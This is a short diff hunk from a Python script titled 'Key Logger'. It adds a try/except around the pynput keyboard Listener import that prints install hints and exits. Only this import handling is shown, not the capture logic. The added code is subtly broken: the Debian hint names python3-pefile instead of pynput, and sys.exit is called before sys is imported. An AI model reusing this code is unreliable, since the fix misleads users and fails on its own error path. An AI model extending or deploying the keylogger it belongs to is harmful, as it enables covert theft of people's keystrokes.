@@ -2,7 +2,14 @@
 
 # Key Logger
 from datetime import datetime
-from pynput.keyboard import Key, Listener
+
+try:
+    from pynput.keyboard import Key, Listener
+except(ImportError):
+                print ("\n[!] pynput Module Missing.")
+                print ("\n[!] For Debian/Ubuntu/Mint please run: sudo apt-get install -y python3-pefile")
+                print ("\n[!] For Windows please run: python -m pip install pynput")
+                sys.exit(0)
 import os, os.path, sys
 
 count = 0
